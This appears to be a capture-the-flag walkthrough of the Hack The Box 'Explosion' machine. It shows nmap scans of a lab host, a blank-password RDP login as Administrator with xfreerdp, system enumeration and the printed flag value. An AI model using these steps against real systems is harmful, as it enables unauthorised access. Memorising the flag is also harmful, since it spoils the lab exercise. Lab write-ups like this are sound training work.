# Explosion
Use ***ping*** to check if the host is up.
```console
kali@kali:~$ ping 10.129.101.245 -c 1
PING 10.129.101.245 (10.129.101.245) 56(84) bytes of data.
64 bytes from 10.129.101.245: icmp_seq=1 ttl=127 time=13.3 ms

--- 10.129.101.245 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 13.279/13.279/13.279/0.000 ms
```

Run an ***nmap*** scan on the top 1000 ports.
```console
kali@kali:~$ nmap -A 10.129.101.245
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-30 03:46 EST
Nmap scan report for 10.129.101.245
Host is up (0.014s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: EXPLOSION
|   NetBIOS_Domain_Name: EXPLOSION
|   NetBIOS_Computer_Name: EXPLOSION
|   DNS_Domain_Name: Explosion
|   DNS_Computer_Name: Explosion
|   Product_Version: 10.0.17763
|_  System_Time: 2022-11-30T08:46:31+00:00
| ssl-cert: Subject: commonName=Explosion
| Not valid before: 2022-11-29T08:38:34
|_Not valid after:  2023-05-31T08:38:34
|_ssl-date: 2022-11-30T08:46:39+00:00; +2s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Run a concurrent nmap scan on all ports.
```console
kali@kali:~$ nmap -A 10.129.101.245 -p-
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-30 03:46 EST
Nmap scan report for 10.129.101.245
Host is up (0.028s latency).
Not shown: 65521 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Explosion
| Not valid before: 2022-11-29T08:38:34
|_Not valid after:  2023-05-31T08:38:34
| rdp-ntlm-info: 
|   Target_Name: EXPLOSION
|   NetBIOS_Domain_Name: EXPLOSION
|   NetBIOS_Computer_Name: EXPLOSION
|   DNS_Domain_Name: Explosion
|   DNS_Computer_Name: Explosion
|   Product_Version: 10.0.17763
|_  System_Time: 2022-11-30T08:48:28+00:00
|_ssl-date: 2022-11-30T08:48:36+00:00; +3s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-11-30T08:48:31
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.28 seconds
```

Connect to the "Explosion" domain on the host via ***RDP*** as "Administrator" without a password using ***xfreerdp.***
```console
kali@kali:~$ xfreerdp /u:"Administrator" /d:"Explosion" /v:10.129.101.245:3389 
[05:11:28:241] [24848:24849] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[05:11:28:242] [24848:24849] [WARN][com.freerdp.crypto] - CN = Explosion
Password: 
[05:11:31:654] [24848:24849] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[05:11:31:654] [24848:24849] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[05:11:31:701] [24848:24849] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[05:11:31:702] [24848:24849] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
...
```

It works. We found the flag. Let's keep going and probe around a bit.

![image](https://user-images.githubusercontent.com/114029528/204775880-f1405604-756c-4745-a1d3-bfa7b8e6a2de.png)

Open a command prompt using the FreeRDP interface.

![image](https://user-images.githubusercontent.com/114029528/204775974-88768dd0-632d-406a-a8c3-277ca623c3a3.png)


Display the group and user.
```bat
C:\Users\Administrator>whoami
explosion\administrator
```
Collect system information to learn more about our environment.
```bat
C:\Users\Administrator>systeminfo
Host Name:                 EXPLOSION
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Domain:                    HACKTHEBOX
Logon Server:              \\EXPLOSION
DHCP Enabled:    Yes
DHCP Server:     10.129.0.1
IP address(es)
[01]: 10.129.101.245
```

Navigate to the desktop directory.
```bat
C:\Users\Administrator>cd Desktop
```


Display the contents of the desktop directory.
```bat
C:\Users\Administrator\Desktop>dir
04/20/2021  08:27 PM    <DIR>          .
04/20/2021  08:27 PM    <DIR>          ..
04/23/2021  01:51 AM                34 flag.txt
               1 File(s)             34 bytes
               2 Dir(s)   4,337,020,928 bytes free
```


Display the flag contents.
```bat
C:\Users\Administrator\Desktop>type flag.txt
951fa96d7830c451b536be5a6be008a0
```
